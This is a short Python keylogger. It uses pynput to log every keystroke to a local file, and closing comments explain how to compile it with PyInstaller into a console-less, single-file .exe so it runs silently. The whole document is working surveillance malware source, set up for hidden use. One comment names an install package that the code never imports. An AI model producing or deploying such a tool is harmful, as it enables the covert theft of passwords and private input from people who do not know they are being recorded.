from pynput import keyboard

# File to save the logs
log_file = "key_log.txt"

# This function is called whenever a key is pressed
def on_press(key):
    try:
        # Try to get alphanumeric key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# This will start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


# pip install keyboard pyinstaller
# python -m venv keyenv && .\keyenv\Scripts\activate 
# Convert to .exe (silent run): 
# >>> pyinstaller --noconsole --onefile keylogger.pyw 
